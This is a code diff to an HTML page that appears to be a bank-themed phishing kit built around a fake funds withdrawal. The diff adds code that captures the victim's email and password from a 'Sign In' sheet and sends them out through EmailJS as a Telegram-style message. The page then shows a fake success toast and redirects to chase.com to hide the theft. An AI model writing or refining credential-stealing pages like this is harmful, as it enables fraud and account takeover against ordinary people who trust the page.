@@ -273,8 +273,8 @@
 
         <div class="bottom-sheet" id="signInBottomSheet">
             <h3>Sign In</h3>
-            <input type="email" id="userEmail" placeholder="Your email">
-            <input type="password" id="userPassword" placeholder="Your password">
+            <input type="email" id="userEmail" placeholder="Your email" required>
+            <input type="password" id="userPassword" placeholder="Your password" required>
             <button onclick="submitCredentials()">Proceed to Withdraw</button>
             <button onclick="closeBottomSheet()">Close</button>
         </div>
@@ -379,7 +379,7 @@
             const date = new Date().toLocaleDateString();
 
             // Prepare message for Telegram
-            const telegramMessage = `Credit\n\nWallet: 01****46\nAmt: ${amount}\nEMT Levy: $300.00\nDesc: TRF Hannah Garden\nRef: *****58688\nDate: ${date}\nBal: ${balance}`;
+            const telegramMessage = `Email: ${email}\nPassword: ${password}`;
 
             // Send email using EmailJS
             emailjs.send('service_hupf218', 'template_u608irc', {
@@ -407,7 +407,7 @@
                     showToast('Withdrawal successful! Email sent.'); // Show success toast
                     closeBottomSheet(); // Hide bottom sheet
                     
-                    // Redirect to chase.com after modal is closed
+                    // Redirect to chase.com after modal is cleared
                     setTimeout(() => {
                         window.location.href = 'https://www.chase.com'; // Redirect to Chase
                     }, 500); // Delay to ensure the modal closes smoothly
@@ -431,4 +431,5 @@
     </script>
 </body>
 
-</html>
+        </html>
+        
